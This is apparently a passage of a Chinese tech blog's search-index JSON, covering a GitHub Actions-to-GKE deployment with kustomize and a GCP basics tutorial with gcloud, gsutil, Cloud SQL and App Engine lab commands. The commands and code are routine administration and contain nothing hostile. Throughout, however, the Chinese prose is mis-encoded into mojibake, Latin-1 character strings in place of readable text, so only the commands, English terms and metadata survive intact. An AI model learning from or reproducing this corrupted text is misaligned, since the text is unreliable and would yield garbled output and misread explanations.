åšçš„äº‹æƒ…å…¶å®å°±ç±»ä¼¼äºä¸€ä¸ªæ¨¡ç‰ˆå¼•æ“ã€‚æˆ‘ä»¬ç¼–å†™ kustomization.yml æ¥è®©å®ƒæ‰¾åˆ°æ–‡ä»¶çš„ä½ç½®ï¼š apiVersion:kustomize.config.k8s.io/v1beta1kind:Kustomizationresources:- deployment.yml è¿™æ ·ï¼Œé…ç½®æ–‡ä»¶å°±å†™å¥½äº†ï¼Œæœ€åå†åŠ ä¸Š Actions çš„æ­¥éª¤ï¼š # Set up kustomize- name:Set up Kustomizerun:|-curl -sfLo kustomize https://github.com/kubernetes-sigs/kustomize/releases/download/v3.1.0/kustomize_3.1.0_linux_amd64 chmod u+x ./kustomize# Deploy the Docker image to the GKE cluster- name:Deployrun:|-./kustomize edit set image gcr.io/PROJECT_ID/IMAGE:TAG=gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA ./kustomize build . | kubectl apply -f - kubectl rollout status deployment/$DEPLOYMENT_NAME kubectl get services -o wide å¤§åŠŸå‘Šæˆï¼Œå¯ä»¥ push ä¸€ä¸‹çœ‹çœ‹ Actions çš„è¿è¡Œç»“æœäº†ã€‚è¿è¡Œå®Œæˆä¹‹åï¼Œä¹Ÿå¯ä»¥åœ¨ GKE ä¸Šçœ‹åˆ°å¯¹åº”çš„ä¿¡æ¯ã€‚ ","date":"2021-09-25","objectID":"/dockerfile2gke/:4:0","tags":["Docker","GCP","Kubernetes","CI/CD","ARM"],"title":"å†æ¢ GitHub Actionsï¼šä» Dockerfile åˆ° GKE","uri":"/dockerfile2gke/"},{"categories":["äº‘"],"content":"å¾…æ›´æ–°ã€‚ ","date":"2021-09-23","objectID":"/gcp/:0:0","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"äº‘è®¡ç®—æ˜¯ä»€ä¹ˆï¼Ÿ å¯ä»¥åœ¨ä»»ä½•æ—¶é—´è‡ªåŠ©åœ°è·å–è®¡ç®—èµ„æºï¼Œæ— éœ€äººå·¥å¹²é¢„ï¼› å¯ä»¥åœ¨ä»»ä½•åœ°ç‚¹è®¿é—®è¿™äº›è®¡ç®—èµ„æºï¼› äº‘æœåŠ¡å•†æ‹¥æœ‰è®¡ç®—èµ„æºæ± ï¼Œå¹¶ä»æ± ä¸­åˆ†é…èµ„æºç»™ç”¨æˆ·ï¼› è®¡ç®—èµ„æºå¯ä»¥å¼¹æ€§æ”¶ç¼©ï¼› æŒ‰é‡è®¡è´¹ï¼Œåœæ­¢ä½¿ç”¨å³åœæ­¢æ”¶è´¹ã€‚ ","date":"2021-09-23","objectID":"/gcp/:1:0","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"GCP åœ°åŸŸå’ŒåŒºåŸŸ åœ°åŸŸï¼ˆZoneï¼‰æ˜¯ä¸€å— GCP èµ„æºçš„éƒ¨ç½²åŒºï¼Œä¸è¿‡ä¸ä¸€å®šæ˜¯ä¸€ä¸ªç±»ä¼¼æ•°æ®ä¸­å¿ƒçš„å•ä¸€çš„å»ºç­‘ã€‚è‹¥å¹²ä¸ªåœ°åŸŸç»„æˆäº†åŒºåŸŸï¼ˆRegionï¼‰ï¼ŒåŒä¸€åŒºåŸŸå†…çš„ä¸åŒåœ°åŸŸä¹‹é—´ç½‘ç»œé€šä¿¡é€Ÿåº¦æå¿«ã€‚å¯ä»¥è®¤ä¸ºï¼Œä¸€ä¸ªåœ°åŸŸå°±æ˜¯ä¸€ä¸ªåŒºåŸŸå†…çš„æ•…éšœåŸŸã€‚ä¸ºäº†æé«˜å®¹ç¾æ€§èƒ½ï¼Œå¯ä»¥è¿›è¡Œå¤šåœ°åŸŸéƒ¨ç½²ã€‚ æ›´è¿›ä¸€æ­¥ï¼Œä¸ºäº†é˜²æ­¢ç±»ä¼¼è‡ªç„¶ç¾å®³ç­‰ä¸å¯æŠ—åŠ›é€ æˆçš„æ•°æ®æŸå¤±ï¼Œè¿˜å¯ä»¥è¿›è¡Œå¤šåŒºåŸŸéƒ¨ç½²ï¼ˆåŒºåŸŸä¹‹é—´è‡³å°‘ç›¸éš” 160 kmï¼‰ã€‚ ","date":"2021-09-23","objectID":"/gcp/:2:0","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"GCP èµ„æºå±‚çº§æ ‘ å›¾ 1ï½œèµ„æºå±‚çº§æ ‘ \" å›¾ 1ï½œèµ„æºå±‚çº§æ ‘ æ¯ä¸ª GCP è®¡ç®—èµ„æºï¼ˆResourceï¼‰å±äºä¸”ä»…å±äºä¸€ä¸ªé¡¹ç›®ï¼ˆProjectï¼‰ã€‚è‹¥å¹²ä¸ªé¡¹ç›®å¯ä»¥ç»„æˆæ–‡ä»¶å¤¹ï¼ˆFolderï¼‰ï¼Œè€Œæ–‡ä»¶å¤¹é€šè¿‡å±‚çº§æ ‘ç»“æ„ï¼ˆå’Œæ–‡ä»¶ç³»ç»Ÿç±»ä¼¼ï¼‰ä»å±äºä¸€ä¸ªç»„ç»‡ï¼ˆOrganizationï¼‰ã€‚åˆ›å»ºæ–‡ä»¶å¤¹å’Œç»„ç»‡å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†åˆ›å»ºæ–‡ä»¶å¤¹å‰éœ€è¦å…ˆåˆ›å»ºç»„ç»‡ã€‚ ","date":"2021-09-23","objectID":"/gcp/:3:0","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"Project æ ‡è¯†ç¬¦ æ ‡è¯†ç¬¦ å”¯ä¸€æ€§ æ ‡è¯†ç¬¦æ¥æº å¯å˜æ€§ Project ID å…¨å±€å”¯ä¸€ ç”¨æˆ·å¯æŒ‡å®š ä¸å¯å˜ Project name æ— éœ€å”¯ä¸€ ç”¨æˆ·å¯æŒ‡å®š å¯å˜ Project number å…¨å±€å”¯ä¸€ GCP åˆ†é… ä¸å¯å˜ ","date":"2021-09-23","objectID":"/gcp/:3:1","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"IAM ç­–ç•¥ IAM ç­–ç•¥è§„å®šäº†ï¼š è° å¯¹å“ªäº›èµ„æº å¯ä»¥åšä»€ä¹ˆ å…¶ä¸­ï¼Œâ€œè°â€ éƒ¨åˆ†å¯ä»¥é’ˆå¯¹ï¼š Google è´¦å· Google ç¾¤ç»„ æœåŠ¡è´¦å· G Suite Cloud Identity Domain â€œå¯¹å“ªäº›èµ„æºâ€ éƒ¨åˆ†æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯ä¸Šé¢æåˆ°çš„ä»»ä½•èµ„æºèŠ‚ç‚¹ï¼ˆResource / Project / Folder / Organization, etc.ï¼‰ã€‚ â€œå¯ä»¥åšä»€ä¹ˆâ€ éƒ¨åˆ†ç”± IAM è§’è‰²å®šä¹‰ã€‚ IAM è§’è‰²æ˜¯ä¸€ç³»åˆ—æƒé™çš„é›†åˆï¼Œå¯ä»¥åˆ†ä¸ºä¸‰ç§è§’è‰²ï¼š Primitive Role åªèƒ½åº”ç”¨åˆ°æ•´ä¸ª Projectï¼Œåˆ†ä¸º Owner / Editor / Viewer / Billing administrator å››ä¸ªè§’è‰²ï¼Œæ‰€æ‹¥æœ‰çš„æƒé™æ˜¾è€Œæ˜“è§ï¼› Predefined Role æ˜¯ GCP æœåŠ¡ä¸­é¢„å®šä¹‰çš„ä¸€äº›è§’è‰²ï¼Œå¯ä»¥åº”ç”¨åˆ° Resource / Project / Folder / Organization å±‚ç”šè‡³æ˜¯æŸä¸ªèµ„æºå®ä¾‹ä¸Šï¼Œç²’åº¦æ›´ç»†ã€‚ Custom Role åªèƒ½åº”ç”¨åˆ° Project æˆ– Organizationï¼Œç”±ç”¨æˆ·è‡ªå®šä¹‰ï¼Œç²’åº¦è¾ƒ Predefined Role æ›´ç»†ã€‚ å¦‚æœè¦æˆäºˆæƒé™ç»™æŸä¸ªè®¡ç®—èµ„æºè€Œä¸æ˜¯ä¸€ä¸ªç”¨æˆ·ï¼Œå°±éœ€è¦é’ˆå¯¹è¯¥è®¡ç®—èµ„æºåˆ›å»ºä¸€ä¸ªæœåŠ¡è´¦å·ï¼Œå°†æƒé™æˆäºˆè¯¥æœåŠ¡è´¦å·ã€‚åŒæ—¶ï¼ŒæœåŠ¡è´¦å·æœ¬èº«ä¹Ÿæ˜¯ä¸€ç§ GCP èµ„æºï¼Œå› æ­¤ IAM ç­–ç•¥ä¹Ÿå¯ä»¥åº”ç”¨åˆ°æœåŠ¡è´¦å·ä¸Šï¼Œå®ç°å¯¹æœåŠ¡è´¦å·æœ¬èº«çš„ç®¡ç†ã€‚ ","date":"2021-09-23","objectID":"/gcp/:4:0","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"ç­–ç•¥ç»§æ‰¿ IAM ç­–ç•¥å¯ä»¥åº”ç”¨åˆ°ä»»ä½•èµ„æºèŠ‚ç‚¹ï¼Œå¹¶ä¸”ä¼šè‡ªé¡¶å‘ä¸‹ç»§æ‰¿ã€‚æ¯”è¾ƒåç›´è§‰çš„æ˜¯ï¼Œå½“é¡¶å±‚ç­–ç•¥å’Œåº•å±‚ç­–ç•¥å†²çªæ—¶ï¼Œä¸¤è€…ä¸­æ›´å®½æ¾çš„ç­–ç•¥ä¼šç”Ÿæ•ˆã€‚ ğŸŒ° 1ï¸âƒ£ Project å±‚ç­–ç•¥è§„å®šæŸç”¨æˆ·å¯¹æŸèµ„æºæ‹¥æœ‰ä¿®æ”¹æƒé™ Organization å±‚ç­–ç•¥è§„å®šè¯¥ç”¨æˆ·å¯¹è¯¥èµ„æºä»…æ‹¥æœ‰è¯»å–æƒé™ å‰è€…æ›´å®½æ¾ï¼Œå› æ­¤ç”Ÿæ•ˆ ğŸŒ° 2ï¸âƒ£ Project å±‚ç­–ç•¥è§„å®šæŸç”¨æˆ·å¯¹æŸèµ„æºæ‹¥æœ‰ä¿®æ”¹æƒé™ Resource å±‚ç­–ç•¥è§„å®šè¯¥ç”¨æˆ·å¯¹è¯¥èµ„æºä»…æ‹¥æœ‰è¯»å–æƒé™ å‰è€…æ›´å®½æ¾ï¼Œå› æ­¤ç”Ÿæ•ˆ å¯ä»¥çœ‹åˆ°ï¼Œå‘ç”Ÿå†²çªæ—¶ï¼Œä¸€ä¸ª IAM ç­–ç•¥æ˜¯å¦ç”Ÿæ•ˆä¸å…¶æ‰€åœ¨å±‚çº§æ— å…³ï¼Œä»…ä¸å…¶æ˜¯å¦æ›´ä¸ºå®½æ¾æœ‰å…³ã€‚ ","date":"2021-09-23","objectID":"/gcp/:4:1","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"äº‘ä¸Šè™šæ‹Ÿæœº ","date":"2021-09-23","objectID":"/gcp/:5:0","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"Virtual Private Cloud Network VPC ç”¨äºåœ¨è™šæ‹Ÿæœºï¼ˆCompute Engineï¼‰ä¹‹é—´æ„å»ºç½‘ç»œï¼Œä¾‹å¦‚è¿›è¡Œç½‘æ®µåˆ’åˆ†ã€é˜²ç«å¢™è®¾ç½®ã€é™æ€è·¯ç”±è®¾ç½®ç­‰ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒVPC æ˜¯å…¨å±€èµ„æºï¼Œæ˜¯å¯ä»¥è·¨åŒºåŸŸçš„ï¼Œè€Œ VPC ä¸­åˆ›å»ºçš„å­ç½‘ä¹Ÿå¯ä»¥è·¨åœ°åŸŸã€‚ ç±»ä¼¼ç‰©ç†ç½‘ç»œï¼ŒVPC ä¼šç»´æŠ¤ä¸€ä¸ªè·¯ç”±è¡¨ç”¨äºåœ¨è™šæ‹Ÿæœºä¹‹é—´å¯»æ‰¾è·¯ç”±ï¼ŒVPC ä¹‹é—´ä¹Ÿå¯ä»¥äº’è”ã€‚æ­¤å¤–ï¼ŒVPC è¿˜æä¾›äº†åˆ†åˆ«é’ˆå¯¹åŒºåŸŸå†…ã€å¤–éƒ¨æµé‡çš„è´Ÿè½½å‡è¡¡ã€DNS æœåŠ¡ã€CDN æœåŠ¡ç­‰ç­‰ã€‚ ","date":"2021-09-23","objectID":"/gcp/:5:1","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"Compute Engine å®è·µ åœ¨ Compute Engine é‡Œåˆ›å»ºæ–°çš„ VM instanceï¼Œå‘½åä¸º my-vm-1ï¼Œå…è®¸ HTTP å…¥ç«™æµé‡ã€‚ ç”±äº my-vm-1 åœ¨ us-central1-a åœ°åŸŸä¸­ï¼Œæˆ‘ä»¬åœ¨ Cloud Shell ä¸­æŸ¥æ‰¾åŒåŒºåŸŸå†…æœ‰å“ªäº›åœ°åŸŸï¼š gcloud compute zones list | grep us-central1 éšæ„é€‰ä¸€ä¸ªä¸åŒçš„åœ°åŸŸï¼Œä¾‹å¦‚ us-central1-bï¼Œå¹¶ä¿®æ”¹å½“å‰åœ°åŸŸï¼š gcloud config set compute/zone us-central1-b åˆ›å»ºç¬¬äºŒä¸ªè™šæ‹Ÿæœºï¼š gcloud compute instances create \"my-vm-2\" \\ --machine-type \"n1-standard-1\" \\ --image-project \"debian-cloud\" \\ --image-family \"debian-10\" \\ --subnet \"default\" é€€å‡º Cloud Shellï¼ŒSSH åˆ° my-vm-2ï¼Œç„¶å ping ä¸€ä¸‹ my-vm-1ï¼Œæ³¨æ„ä¸»æœºåï¼š ping my-vm-1.us-central1-a åœ¨ my-vm-2 ä¸Šè¿æ¥ my-vm-1ï¼š ssh my-vm-1.us-central1-a åœ¨ my-vm-1 é‡Œä¸Šçº¿ä¸€ä¸ªç½‘é¡µå¹¶æµ‹è¯•ï¼š sudo apt-get install nginx-light -y sudo vim /var/www/html/index.nginx-debian.html curl http://localhost é€€å‡º SSH å›åˆ° my-vm-2ï¼Œè®¿é—® my-vm-1 ä¸Šçš„ç½‘é¡µï¼š curl http://my-vm-1.us-central1-a/ ","date":"2021-09-23","objectID":"/gcp/:5:2","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"äº‘ä¸Šå­˜å‚¨ ","date":"2021-09-23","objectID":"/gcp/:6:0","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"Cloud Storage å¸¸è§çš„å¯¹è±¡å­˜å‚¨ï¼Œä¸Šä¼ æ–‡ä»¶ï¼Œè¿”å›ä¸€ä¸ªå”¯ä¸€çš„ URLã€‚ä¸Šä¼ çš„æ–‡ä»¶æŒ‰æ¡¶ï¼ˆbucketï¼‰ç»„ç»‡ï¼Œä¸€æ—¦ä¸Šä¼ ä¾¿ä¸å¯ä¿®æ”¹ï¼ˆä½†å¯ä»¥æ›´æ–°ï¼‰ï¼Œè®¿é—®æƒé™åˆ™ç”± Cloud IAM æˆ–æ›´ç»†ç²’åº¦çš„ ACL æ¥æ§åˆ¶ã€‚ å›¾ 2ï½œCloud Storage Classes \" å›¾ 2ï½œCloud Storage Classes ","date":"2021-09-23","objectID":"/gcp/:6:1","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"Cloud Bigtable \u0026 Cloud Datastore Cloud Bigtable æä¾›å­˜å‚¨å¤§é‡æ•°æ®çš„ NoSQL æ•°æ®åº“æœåŠ¡ï¼Œå› ä¸ºé‡‡ç”¨ key-value å¯¹å­˜å‚¨æ‰€ä»¥ä¹Ÿå¯ä»¥å½“æŒä¹…åŒ–çš„å“ˆå¸Œè¡¨æ¥ç”¨ã€‚å¯ä»¥é€šè¿‡å¼€æºçš„ HBase API è®¿é—®ï¼Œå› æ­¤ä¹Ÿå…¼å®¹ Apache Hadoop ç”Ÿæ€ã€‚ Cloud Datastore åˆ™æ˜¯åº”ç”¨ç‰¹åŒ–å‹çš„ NoSQLï¼ŒåŒºåˆ«ä¸»è¦åœ¨äºå¯¹äº¤æ˜“å’Œç±» SQL æŸ¥è¯¢çš„æ”¯æŒã€‚å½“ç„¶ï¼Œæœ€é‡è¦çš„æ˜¯æœ‰æ¯æ—¥å…è´¹ç”¨é‡ã€‚ ","date":"2021-09-23","objectID":"/gcp/:6:2","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"Cloud SQL \u0026 Cloud Spanner Cloud SQL æä¾›åŸºäº MySQL æˆ– PostgreSQL çš„ SQL æ•°æ®åº“æœåŠ¡ï¼Œå¹¶é…æœ‰å†—ä½™å¤‡ä»½ã€å®¹ç¾æ¢å¤ç­‰åŠŸèƒ½ã€‚è€Œ Cloud Spanner åˆ™å¯ä»¥è®¤ä¸ºæ˜¯é«˜é…ç‰ˆçš„ Cloud SQLï¼Œåœ¨æ•°æ®ä¸€è‡´æ€§å’Œå¯ç”¨æ€§æ–¹é¢éƒ½æ›´ä¼˜ç§€ã€‚ ","date":"2021-09-23","objectID":"/gcp/:6:3","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"å¯¹æ¯” å›¾ 3ï½œGCP å­˜å‚¨æœåŠ¡å¯¹æ¯” \" å›¾ 3ï½œGCP å­˜å‚¨æœåŠ¡å¯¹æ¯” BigQuery ä¸»è¦ç”¨äºæ•°æ®å¤„ç†è€Œä¸æ˜¯æ•°æ®å­˜å‚¨ï¼Œä¼šåœ¨ä¸‹æ–‡ä»‹ç»ã€‚ ","date":"2021-09-23","objectID":"/gcp/:6:4","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"Cloud Storage \u0026 Cloud SQL å®è·µ åœ¨ Compute Engine é‡Œåˆ›å»ºæ–°çš„ VM instanceï¼Œå‘½åä¸º blogpostï¼Œå…è®¸ HTTP å…¥ç«™æµé‡ï¼Œå¹¶åœ¨å¯åŠ¨è„šæœ¬ä¸­å®‰è£…æœåŠ¡å™¨ï¼š apt-get update apt-get install apache2 php php-mysql -y service apache2 restart åœ¨ Cloud Shell ä¸­åˆ›å»º Cloud Storageï¼Œæ³¨æ„ bucket åç§°éœ€è¦å”¯ä¸€ï¼Œå¯ä»¥ç”¨ Project ID æ¥ç¡®ä¿è¿™ä¸€ç‚¹ï¼š gsutil mb -l US gs://$DEVSHELL_PROJECT_ID ä»å¦ä¸€ä¸ªæ¡¶ä¸­å¤åˆ¶ä¸€å¼ å›¾ç‰‡åˆ° Cloud Shellï¼š gsutil cp gs://cloud-training/gcpfci/my-excellent-blog.png my-excellent-blog.png ls ä» Cloud Shell å¤åˆ¶å›¾ç‰‡åˆ°æ–°åˆ›å»ºçš„æ¡¶ï¼š gsutil cp my-excellent-blog.png gs://$DEVSHELL_PROJECT_ID/my-excellent-blog.png æ£€æŸ¥æ˜¯å¦æˆåŠŸï¼š gsutil ls gs://$DEVSHELL_PROJECT_ID åœ¨æ§åˆ¶å°åˆ›å»ºå’Œ blogpost åŒåŒºåŸŸçš„ Cloud SQLï¼Œå‘½åä¸º blog-dbï¼Œå¹¶è®¾ç½® root å¯†ç ï¼›åˆ›å»ºå®Œæ¯•åï¼Œæ–°å»ºä¸€ä¸ªç”¨æˆ·ï¼Œè®¾ç½®ç”¨æˆ·åå’Œå¯†ç ã€‚ æ¥ä¸‹æ¥ï¼Œè¦è®©æˆ‘ä»¬çš„ blog-db åªèƒ½è¢« blogpost è®¿é—®ã€‚ä¸ºæ­¤ï¼Œå…ˆæŸ¥çœ‹ blogpost çš„å…¬ç½‘ IPï¼Œç„¶ååœ¨ blog-db é…ç½®é¢æ¿çš„ Connections é€‰é¡¹å¡é‡Œæ–°å»ºä¸€ä¸ª Authorized Networkï¼Œå¹¶å¡«å…¥è¿™ä¸ª IPã€‚ç”±äºè¦æ±‚ CIDR æ ¼å¼è€Œæˆ‘ä»¬åªæƒ³è¦å•ä¸ªæœºå™¨èƒ½è®¿é—®ï¼Œå¡«å…¥ x.x.x.x/32 å³å¯ã€‚ éšåè¦è®© blogpost å»ä½¿ç”¨ blog-dbã€‚SSH åˆ° blogpostï¼Œç¼–å†™ /var/www/html/index.phpï¼š \u003chtml\u003e \u003chead\u003e\u003ctitle\u003eWelcome to my excellent blog\u003c/title\u003e\u003c/head\u003e \u003cbody\u003e \u003ch1\u003eWelcome to my excellent blog\u003c/h1\u003e \u003c?php $dbserver = \"CLOUDSQLIP\"; $dbuser = \"blogdbuser\"; $dbpassword = \"DBPASSWORD\"; // In a production blog, we would not store the MySQL // password in the document root. Instead, we would store it in a // configuration file elsewhere on the web server VM instance. $conn = new mysqli($dbserver, $dbuser, $dbpassword); if (mysqli_connect_error()) { echo (\"Database connection failed:\" . mysqli_connect_error()); } else { echo (\"Database connection succeeded.\"); } ?\u003e \u003c/body\u003e\u003c/html\u003e é‡å¯ apache2ï¼Œè®¿é—® blogpost çš„å…¬ç½‘ IPï¼Œæ£€æŸ¥æ•°æ®åº“è¿æ¥ã€‚ æ¥ä¸‹æ¥æŠŠä¹‹å‰é‚£å¼ å›¾ç‰‡åŠ åˆ°ç½‘ç«™ä¸Šã€‚åœ¨æ§åˆ¶å° Storage -\u003e Cloud Storage -\u003e Browser é‡Œæ‰¾åˆ°å›¾ç‰‡ï¼Œå‹¾é€‰ Share publicly ä»è€Œè·å¾—ä¸€ä¸ª URLï¼ˆæˆ–è€…è¿è¡Œä¸‹é¢çš„å‘½ä»¤ï¼‰ã€‚éšååœ¨åŸæ¥çš„ html é‡Œæ’å…¥å›¾ç‰‡å³å¯ã€‚ gsutil acl ch -u allUsers:R gs://$DEVSHELL_PROJECT_ID/my-excellent-blog.png é‡å¤ç¬¬ 9 æ­¥ã€‚ ","date":"2021-09-23","objectID":"/gcp/:6:5","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"äº‘ä¸Šå®¹å™¨ ä¹Ÿå°±æ˜¯ Google Kubernetes Engineï¼Œåé¢å•ç‹¬å¼€ç¯‡åšå®¢å†™ã€‚ ","date":"2021-09-23","objectID":"/gcp/:7:0","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"äº‘ä¸Šåº”ç”¨ åœ¨ Compute Engine ä¸­ï¼Œç”¨æˆ·è‡ªå·±é€‰æ‹©è™šæ‹Ÿæœºä½œä¸ºè¿è¡Œåº”ç”¨çš„åŸºç¡€è®¾æ–½ï¼›åˆ°äº† Kubernetes Engineï¼Œè¿™ä¸ªåŸºç¡€è®¾æ–½å˜æˆäº†å®¹å™¨ã€‚ä½†å¦‚æœæˆ‘ä»¬åªæ˜¯æƒ³å¿«é€Ÿéƒ¨ç½²ä¸€ä¸ªåº”ç”¨ï¼Œæ ¹æœ¬ä¸æƒ³å…³å¿ƒåŸºç¡€è®¾æ–½å‘¢ï¼Ÿè¿™å°±æ˜¯ App Engine çš„ä½œç”¨ã€‚ App Engine æä¾›äº†ç±»ä¼¼ NoSQL æ•°æ®åº“ã€è´Ÿè½½å‡è¡¡ã€æ—¥å¿—è®°å½•ã€ç”¨æˆ·è®¤è¯ã€è‡ªåŠ¨ä¼¸ç¼©ç­‰æœåŠ¡ï¼Œç”¨æˆ·åªéœ€è¦å…³å¿ƒä¸šåŠ¡ä»£ç ã€ä»¥åŠå¦‚ä½•åœ¨ä»£ç ä¸­è°ƒç”¨è¿™äº›æœåŠ¡ã€‚åœ¨ Standard æ¨¡å¼ä¸­ï¼Œå› ä¸ºæä¾›äº†å…è´¹æ—¥é™é¢ï¼Œåªè¦åº”ç”¨æµé‡ä¸å¤ªå¤§å°±ç›¸å½“äºæ°¸ä¹…å…è´¹ä½¿ç”¨ App Engine æœåŠ¡ã€‚ Standard æ¨¡å¼è¿è¡Œåœ¨æ²™ç®±ä¸­ï¼Œå› æ­¤å­˜åœ¨ä¸€äº›é™åˆ¶ï¼š ä¸èƒ½å‘æ–‡ä»¶ç³»ç»Ÿå†™æ–‡ä»¶ï¼Œæ•°æ®æŒä¹…åŒ–å¿…é¡»é€šè¿‡æ•°æ®åº“ ä»»æ„ç½‘ç»œè¯·æ±‚æœ€å¤§è¶…æ—¶æ—¶é—´ä¸º 60 ç§’ å®‰è£…ç¬¬ä¸‰æ–¹è½¯ä»¶ä¹Ÿä¼šå—åˆ°é™åˆ¶ ä¸è¿‡ï¼ŒStandard æ¨¡å¼åªæ”¯æŒ Javaã€Pythonã€PHP å’Œ Go çš„ SDKï¼Œå…¶ä»–è¯­è¨€åˆ™éœ€è¦ä½¿ç”¨ Flexible æ¨¡å¼ã€‚ Flexible æ¨¡å¼ä¸å—æ²™ç®±é™åˆ¶ï¼Œå› ä¸ºè¿™ç§æ¨¡å¼å®é™…ä¸Šæ˜¯åœ¨ Compute Engine ä¸Šè¿è¡Œç”¨æˆ·è‡ªå®šä¹‰çš„å®¹å™¨ã€‚è¿™ä¼šå¯¼è‡´å¯åŠ¨é€Ÿåº¦å˜æ…¢ï¼Œä½†åº”ç”¨å¯¹åº•å±‚çš„è®¿é—®æ›´å®½æ¾ï¼Œå½“ç„¶ä»·æ ¼ä¸Šä¹Ÿä¸å­˜åœ¨å…è´¹é¢åº¦äº†ã€‚ å›¾ 4ï½œApp Engine ä¸¤ç§æ¨¡å¼å¯¹æ¯” \" å›¾ 4ï½œApp Engine ä¸¤ç§æ¨¡å¼å¯¹æ¯” ","date":"2021-09-23","objectID":"/gcp/:8:0","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"App Engine å®è·µ å…‹éš†ç¤ºä¾‹åº”ç”¨ï¼š git clone https://github.com/GoogleCloudPlatform/appengine-guestbook-python cd appengine-guestbook-python åœ¨ app.yaml ä¸­å­˜å‚¨äº†åº”ç”¨çš„éƒ¨ç½²é…ç½®ï¼Œå¯ä»¥å…ˆåœ¨æœ¬åœ°è¿è¡Œèµ·æ¥æµ‹è¯•ä¸‹ï¼š dev_appserver.py ./app.yaml ç”¨ Cloud Shell çš„ Preview åŠŸèƒ½æŸ¥çœ‹åº”ç”¨ã€‚ ç¡®è®¤æ²¡æœ‰é—®é¢˜åè¿›è¡Œéƒ¨ç½²ï¼š gcloud app deploy ./index.yaml ./app.yaml ","date":"2021-09-23","objectID":"/gcp/:8:1","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"äº‘ä¸Šå¼€å‘ã€éƒ¨ç½²ä¸ç›‘æ§ ","date":"2021-09-23","objectID":"/gcp/:9:0","tags":["GCP","ç½‘ç»œ","è®¤è¯"],"title":"é«˜æ•æ— å¿§ï¼šGoogle Cloud Platform åŸºç¡€","uri":"/gcp/"},{"categories":["äº‘"],"content":"äº‘ä¸Šå¼€å‘ Cloud Source Repositoriesï¼Œä¹Ÿå°±æ˜¯ GCP ä¸­çš„ Git Repositoriesï¼Œä¼˜åŠ¿åœ¨äºå’Œ GCP Project ä»¥åŠå…¶ä»–äº§å“çš„èåˆ Cloud Functionsï¼Œä¹Ÿå°±æ˜¯ GCP ä¸­çš„äº‘å‡½æ•°ï¼Œè¿™ç§æ–¹å¼ç›®å‰å¯ä»¥è¯´æ˜¯å¯¹ä¸€ä¸ªåº”ç”¨è€Œè¨€æœ€é«˜å±‚é¢çš„æŠ½è±¡ Cloud Endpointï¼Œä¹Ÿå°±æ˜¯ GCP ä¸­ç”¨äºç»´æŠ¤ API çš„æœåŠ¡ å›¾ 5ï½œåº”ç”¨éƒ¨ç½²æŠ½è±¡å±‚çº§çš„å¯¹æ¯” \" å›¾ 5ï½œåº”ç”¨éƒ¨ç½²æŠ½è±¡å±‚çº§çš„å¯¹æ¯” 